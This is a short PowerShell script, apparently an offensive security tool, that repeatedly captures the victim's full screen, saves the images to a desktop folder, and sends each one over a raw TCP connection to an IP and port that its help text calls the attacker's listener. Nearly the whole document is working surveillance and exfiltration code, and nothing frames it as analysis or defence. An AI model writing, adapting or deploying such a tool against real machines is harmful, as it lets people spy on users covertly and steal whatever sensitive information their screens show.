<#

Author: Austin Coontz (@Coontzy1)

#>

<#
.SYNOPSIS
This script captures screenshots of the primary monitor and sends them to a specified destination.

.EXAMPLE
.\screenshotter.ps1 -count 20 -interval 30 -DestIP 192.168.0.101 -DestPort 80

.PARAMETER COUNT
Number of screenshots to take (default: 10).

.PARAMETER INTERVAL
Time interval (in seconds) between screenshots (default: 10).

.PARAMETER DestIP
Destination IP of the attacker's listener.

.PARAMETER DestPort
Destination port of the attacker's listener.
#>

param (
    [Parameter(Mandatory=$false)]
    [int]$COUNT = 10,      # Default to 10 if not supplied

    [Parameter(Mandatory=$false)]
    [int]$INTERVAL = 10,     # Default to 10 if not supplied

    [Parameter(Mandatory=$true)]
    [string]$DestIP,    # Destination IP address

    [Parameter(Mandatory=$true)]
    [int]$DestPort      # Destination port
)

Add-Type -AssemblyName System.Drawing

# Screenshots Directory - Creates it if not there
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "Screenshots")
if (-not (Test-Path $desktopPath)) {
    New-Item -ItemType Directory -Path $desktopPath | Out-Null
}

# Getting Height x Width Resolutions
$controller = Get-WmiObject win32_videocontroller | Select-Object CurrentHorizontalResolution, CurrentVerticalResolution
$totalWidth = [int]$controller.CurrentHorizontalResolution
$totalHeight = [int]$controller.CurrentVerticalResolution

# Capture screenshots
for ($i = 1; $i -le $COUNT; $i++) {
    # Create a bitmap for the resolution
    $bmp = New-Object System.Drawing.Bitmap($totalWidth, $totalHeight)
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)

    # Capture the full desktop
    $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
    $bmp.Save("$desktopPath\screenshot_$i.png")
    Write-Host "Screenshot $i saved successfully." -ForegroundColor Green

    # Dispose of resources
    $graphics.Dispose()
    $bmp.Dispose()

    # Send the screenshot over TCP
    $fileBytes = [System.IO.File]::ReadAllBytes("$desktopPath\screenshot_$i.png")
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($DestIP, $DestPort)
    $stream = $client.GetStream()
    $stream.Write($fileBytes, 0, $fileBytes.Length)
    Write-Host "File screenshot_$i.png sent to $DestIP : $DestPort" -ForegroundColor Red
    $stream.Close()
    $client.Close()

    Start-Sleep -Seconds $INTERVAL
}
